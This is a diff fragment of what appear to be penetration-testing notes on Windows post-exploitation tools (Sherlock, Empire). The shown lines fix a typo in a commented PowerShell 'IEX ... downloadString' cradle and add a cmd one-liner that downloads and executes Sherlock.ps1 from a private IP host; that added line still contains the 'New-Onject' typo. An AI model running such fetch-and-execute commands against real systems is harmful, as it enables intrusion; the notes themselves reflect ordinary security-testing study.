@@ -20,9 +20,11 @@ https://github.com/rasta-mouse/Sherlock
 # - at the end of the scripts, add < Find-AllVulns >
 #
 # - Invoke expression (IEX) in powershell prompt
-# IEX(New-Onject Net.Webclient).downloadString('http://ip:8080/sherlock.ps1')
+# IEX(New-Object Net.Webclient).downloadString('http://ip:8080/sherlock.ps1')
 ###################################################################################################################################
 
+Note : We can execute directly powershell command from cmd, as below :
+powershell -command "IEX(New-Onject Net.Webclient).downloadString('http://10.11.0.41:8080/Sherlock.ps1')"
 
 3. Empire : A PowerShell and Python post-exploitation agent.
 https://github.com/EmpireProject/Empire
